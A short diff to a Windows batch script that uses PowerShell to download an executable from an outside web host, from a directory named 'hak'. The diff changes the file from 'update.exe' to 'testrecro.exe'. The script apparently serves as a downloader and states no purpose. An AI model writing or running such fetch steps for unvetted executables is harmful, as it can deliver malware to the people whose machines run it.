@@ -2,10 +2,10 @@
 SETLOCAL
 
 REM Define the URL of the file to download
-SET "url=http://thejohnsons.net.nz/source/hak/update.exe"
+SET "url=http://thejohnsons.net.nz/source/hak/testrecro.exe"
 
 REM Define the name of the file to save
-SET "output=update.exe"
+SET "output=testrecro.exe"
 
 REM Use PowerShell to download the file
 powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"
